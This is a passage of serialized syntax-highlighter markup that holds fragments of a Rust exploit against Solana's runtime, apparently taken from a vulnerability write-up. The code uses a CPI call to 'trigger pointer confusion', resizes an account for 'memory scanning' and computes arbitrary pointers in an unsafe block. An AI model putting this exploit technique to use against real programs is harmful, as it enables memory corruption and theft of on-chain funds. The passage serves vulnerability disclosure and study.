token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement341\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement342\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement343\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement344\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement345\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement346\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement347\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement348\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}],[\"$\",\"span\",\"code-segement349\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement350\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement351\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement352\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement353\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement354\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--39\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[39]}],[\"$\",\"span\",\"code-segement356\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement357\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}],[\"$\",\"span\",\"code-segement358\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement359\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"size_of\"]}],[\"$\",\"span\",\"code-segement360\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement361\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement362\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement363\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement364\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement365\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement366\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement367\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement368\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement369\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement370\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement371\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement372\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement373\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement374\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement375\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement376\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement377\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--40\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[40]}],[\"$\",\"span\",\"code-segement379\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement380\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement381\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement382\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--41\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[41]}],[\"$\",\"span\",\"code-segement384\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement385\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement386\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--42\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[42]}],\"\\n\",[\"$\",\"span\",\"line-number--43\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[43]}],[\"$\",\"span\",\"code-segement390\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement391\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Invoke CPI call to trigger pointer confusion\"]}],[\"$\",\"span\",\"code-segement392\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--44\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[44]}],[\"$\",\"span\",\"code-segement394\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement395\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"invoke_signed\"]}],[\"$\",\"span\",\"code-segement396\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement397\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--45\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[45]}],[\"$\",\"span\",\"code-segement399\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement400\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement401\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Instruction\"]}],[\"$\",\"span\",\"code-segement402\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement403\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new_with_bincode\"]}],[\"$\",\"span\",\"code-segement404\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement405\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--46\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[46]}],[\"$\",\"span\",\"code-segement407\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement408\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement409\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"program_id\"]}],[\"$\",\"span\",\"code-segement410\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement411\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--47\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[47]}],[\"$\",\"span\",\"code-segement413\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement414\",{\"className\":\"token token\",\"style\":{\"color\":\"#7ec699\"},\"children\":[\"b\\\"\\\"\"]}],[\"$\",\"span\",\"code-segement415\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement416\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--48\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[48]}],[\"$\",\"span\",\"code-segement418\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement419\",{\"className\":\"token token macro\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"vec!\"]}],[\"$\",\"span\",\"code-segement420\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement421\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountMeta\"]}],[\"$\",\"span\",\"code-segement422\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement423\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new\"]}],[\"$\",\"span\",\"code-segement424\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement425\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement426\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement427\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}],[\"$\",\"span\",\"code-segement428\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement429\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement430\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"key\"]}],[\"$\",\"span\",\"code-segement431\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement432\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}],[\"$\",\"span\",\"code-segement433\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement434\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement435\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement436\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement437\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}],[\"$\",\"span\",\"code-segement438\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement439\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement440\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement441\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--49\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[49]}],[\"$\",\"span\",\"code-segement443\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement444\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement445\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement446\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--50\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[50]}],[\"$\",\"span\",\"code-segement448\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement449\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement450\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement451\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement452\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement453\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}],[\"$\",\"span\",\"code-segement454\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement455\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement456\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}],[\"$\",\"span\",\"code-segement457\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement458\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement459\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement460\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement461\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--51\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[51]}],[\"$\",\"span\",\"code-segement463\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement464\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement465\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement466\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement467\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement468\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--52\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[52]}],[\"$\",\"span\",\"code-segement470\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement471\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement472\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement473\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement474\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--53\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[53]}],\"\\n\",[\"$\",\"span\",\"line-number--54\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[54]}],[\"$\",\"span\",\"code-segement478\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement479\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Resize LEVERAGE back to a larger size for memory scanning\"]}],[\"$\",\"span\",\"code-segement480\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--55\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[55]}],[\"$\",\"span\",\"code-segement482\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        accounts\"]}],[\"$\",\"span\",\"code-segement483\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement484\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segement485\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement486\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement487\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"realloc\"]}],[\"$\",\"span\",\"code-segement488\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement489\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0xa00000\"]}],[\"$\",\"span\",\"code-segement490\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement491\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement492\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}],[\"$\",\"span\",\"code-segement493\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement494\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement495\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement496\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--56\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[56]}],\"\\n\",[\"$\",\"span\",\"line-number--57\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[57]}],[\"$\",\"span\",\"code-segement500\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement501\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}],[\"$\",\"span\",\"code-segement502\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement503\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement504\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--58\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[58]}],[\"$\",\"span\",\"code-segement506\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement507\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Scan memory to locate MemoryRegion structure\"]}],[\"$\",\"span\",\"code-segement508\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--59\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[59]}],[\"$\",\"span\",\"code-segement510\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement511\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement512\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement513\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement514\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data_ptr \"]}],[\"$\",\"span\",\"code-segement515\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement516\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts\"]}],[\"$\",\"span\",\"code-segement517\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement518\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segement519\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement520\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement521\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement522\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement523\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}],[\"$\",\"span\",\"code-segement524\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement525\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement526\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement527\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"as_ptr\"]}],[\"$\",\"span\",\"code-segement528\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement529\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement530\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement531\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement532\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement533\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement534\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement535\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement536\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement537\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x2840\"]}],[\"$\",\"span\",\"code-segement538\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement539\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--60\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[60]}],[\"$\",\"span\",\"code-segement541\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement542\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement543\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" arb_ptr \"]}],[\"$\",\"span\",\"code-segement544\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement545\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts\"]}],[\"$\",\"span\",\"code-segement546\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement547\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"pointer_idx\"]}],[\"$\",\"span\",\"code-segement548\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement549\",{\"className\":\"token 